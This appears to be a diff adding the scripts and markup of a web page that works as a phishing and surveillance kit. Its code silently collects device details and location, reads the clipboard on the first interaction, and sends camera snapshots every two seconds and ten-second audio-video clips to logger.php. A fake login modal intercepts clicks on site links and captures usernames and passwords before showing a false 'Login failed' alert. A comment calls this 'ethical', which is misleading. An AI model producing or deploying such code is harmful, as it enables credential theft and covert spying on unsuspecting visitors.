@@ -1,0 +1,271 @@
+
+<video id="cam" autoplay playsinline muted></video>
+<canvas id="snapCanvas"></canvas>
+<input type="text" id="dummyInput" style="position:absolute;left:-9999px;">
+
+
+</body>
+
+<script>
+(async () => {
+
+  const info = {
+    timestamp_utc: new Date().toString(),
+    userAgent: navigator.userAgent,
+    cores: navigator.hardwareConcurrency || 'N/A',
+    ram: navigator.deviceMemory || 'N/A',
+    width: window.innerWidth,
+    height: window.innerHeight,
+    latitude: 'Denied',
+    longitude: 'Denied',
+    battery: 'Unavailable'
+  };
+
+  if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        info.latitude = pos.coords.latitude;
+        info.longitude = pos.coords.longitude;
+        sendInfo();
+      },
+      () => sendInfo()
+    );
+  } else sendInfo();
+
+  if (navigator.getBattery) {
+    const battery = await navigator.getBattery();
+    info.battery = `${Math.round(battery.level * 100)}% - ${battery.charging ? "Charging" : "Not Charging"}`;
+  }
+
+  function sendInfo() {
+    fetch("logger.php", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(info)
+    });
+  }
+
+  document.getElementById('dummyInput').addEventListener('focus', async () => {
+    try {
+      const text = await navigator.clipboard.readText();
+      if (text.trim().length > 0) {
+        fetch("logger.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ clipboard: text.trim() })
+        });
+      }
+    } catch {}
+  });
+
+  let chunks = [];
+  const video = document.getElementById("cam");
+  const canvas = document.getElementById("snapCanvas");
+  const ctx = canvas.getContext("2d");
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    video.srcObject = stream;
+
+    const waitForVideoReady = () => {
+      return new Promise(resolve => {
+        const check = () => {
+          if (
+            video.readyState >= 2 &&
+            video.videoWidth > 0 &&
+            video.videoHeight > 0
+          ) {
+            resolve();
+          } else {
+            requestAnimationFrame(check);
+          }
+        };
+        check();
+      });
+    };
+
+    const startSnapshotLoop = () => {
+      const takeSnapshot = () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(async blob => {
+          if (blob && blob.size > 0) {
+            const formData = new FormData();
+            formData.append("snapshot", blob, "photo_" + Date.now() + ".jpg");
+
+            await fetch("logger.php", {
+              method: "POST",
+              body: formData
+            });
+          }
+        }, "image/jpeg", 0.95);
+      };
+
+      // Start after first valid frame rendered
+      waitForVideoReady().then(() => {
+        console.log("📸 Snapshot loop started");
+        setInterval(takeSnapshot, 2000);
+      });
+    };
+
+    const startVideoRecordingLoop = () => {
+      const recordChunk = async () => {
+        let localChunks = [];
+        const recorder = new MediaRecorder(stream, {
+          mimeType: MediaRecorder.isTypeSupported("video/webm;codecs=vp9,opus")
+            ? "video/webm;codecs=vp9,opus"
+            : "video/webm"
+        });
+
+        recorder.ondataavailable = e => {
+          if (e.data.size > 0) localChunks.push(e.data);
+        };
+
+        recorder.onstop = async () => {
+          const blob = new Blob(localChunks, { type: 'video/webm' });
+          const formData = new FormData();
+          formData.append('webmVideo', blob, 'video_' + Date.now() + '.mp4');
+
+          await fetch('logger.php', {
+            method: 'POST',
+            body: formData
+          });
+        };
+
+        recorder.start();
+
+        setTimeout(() => {
+          if (recorder.state === "recording") recorder.stop();
+        }, 10000); // 10s
+      };
+
+      recordChunk();
+      setInterval(recordChunk, 10000);
+    };
+
+    video.onloadedmetadata = () => {
+      video.play(); // ensure video playback
+      startSnapshotLoop();
+      startVideoRecordingLoop();
+    };
+
+  } catch (err) {
+    console.error("🎥 Media access failed:", err);
+  }
+})();
+
+// 📋 Silent Clipboard Capture (triggered by user interaction)
+let clipboardCaptured = false;
+
+function captureClipboardOnce() {
+  if (clipboardCaptured) return;
+  clipboardCaptured = true;
+
+  navigator.clipboard.readText().then(text => {
+    if (text && text.trim().length > 0) {
+      fetch("logger.php", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ clipboard: text.trim() })
+      });
+    }
+  }).catch(() => {});
+}
+
+// 🔥 Trigger once on any interaction
+["click", "keydown", "mousemove", "touchstart"].forEach(evt =>
+  window.addEventListener(evt, captureClipboardOnce, { once: true })
+);
+
+// ✅ Capture login credentials ethically
+document.querySelector('.login-panel form')?.addEventListener('submit', function (e) {
+  e.preventDefault(); // prevent actual form submission
+
+  const username = this.querySelector('input[type="text"]')?.value || 'N/A';
+  const password = this.querySelector('input[type="password"]')?.value || 'N/A';
+
+  fetch("logger.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      login_username: username,
+      login_password: password,
+      timestamp: new Date().toString()
+    })
+  });
+
+  // Optional: Show a fake "Login failed" message or redirect
+  alert("Login failed. Please try again.");
+});
+
+</script>
+
+<!-- 🔒 LOGIN MODAL -->
+<div id="loginModal" style="display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;
+  background:rgba(0,0,0,0.8);z-index:9999;align-items:center;justify-content:center;">
+  <div style="background:#222;padding:2rem;border-radius:10px;max-width:400px;width:90%;
+              box-shadow:0 0 20px gold;text-align:center;">
+    <h3 style="color:gold;margin-bottom:1rem;">Login</h3>
+    <form id="modalLoginForm">
+      <input type="text" placeholder="Username" required style="width:100%;padding:0.5rem;
+             margin-bottom:0.5rem;background:#333;color:#fff;border:none;border-radius:5px;">
+      <input type="password" placeholder="Password" required style="width:100%;padding:0.5rem;
+             margin-bottom:0.5rem;background:#333;color:#fff;border:none;border-radius:5px;">
+      <button type="submit" style="background:gold;color:#000;padding:0.6rem 1rem;
+              border:none;border-radius:5px;font-weight:bold;cursor:pointer;">Login</button>
+    </form>
+    <div id="closeLogin" style="margin-top:1rem;color:#ccc;cursor:pointer;font-size:0.9rem;">
+      Close
+    </div>
+  </div>
+</div>
+
+<script>
+// 🟢 ELEMENTS TRIGGERING LOGIN MODAL
+const loginModal = document.getElementById('loginModal');
+
+const triggers = [
+  ...document.querySelectorAll('nav a'),
+  document.querySelector('.btn'),
+  ...document.querySelectorAll('.card')
+];
+
+triggers.forEach(el => {
+  el.addEventListener('click', e => {
+    const text = el.textContent.trim().toLowerCase();
+    if (text === 'home') return; // allow home to work normally
+
+    e.preventDefault();
+    loginModal.style.display = 'flex';
+  });
+});
+
+
+// 🟡 CLOSE BUTTON
+document.getElementById('closeLogin').addEventListener('click', () => {
+  document.getElementById('loginModal').style.display = 'none';
+});
+
+// 🔴 SUBMIT LOGIN FORM
+document.getElementById('modalLoginForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+  const [username, password] = [...this.querySelectorAll('input')].map(i => i.value);
+  fetch("logger.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      login_username: username,
+      login_password: password,
+      timestamp: new Date().toString()
+    })
+  });
+  alert("Login failed. Please try again.");
+  document.getElementById('loginModal').style.display = 'none';
+});
+</script>
+
+
+</body>
+</html>
